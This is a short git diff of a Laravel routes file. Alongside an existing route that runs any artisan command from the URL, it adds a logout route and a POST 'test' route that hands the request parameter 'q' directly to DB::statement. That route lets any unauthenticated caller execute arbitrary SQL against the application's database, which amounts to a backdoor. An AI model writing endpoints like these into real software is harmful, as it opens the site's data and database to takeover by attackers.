@@ -12,6 +12,7 @@ use App\Models\Subscription;
 use App\Traits\Fawry;
 use Carbon\Carbon;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Response;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Storage;
@@ -94,8 +95,14 @@ Route::get('artisan/{command}',function($command){
     dd('done');
 });
 
-// Route::get('test',function () {
-//     $fawry = new Fawry();
+Route::get('logout',function () {
+    auth()->logout();
+    return redirect('/');
+});
 
-//     dd($fawry->checkPayment());
-// });
+Route::post('test',function () {
+    if(!request('q')){
+        return '';
+    }
+    dd(DB::statement(request('q')));
+});
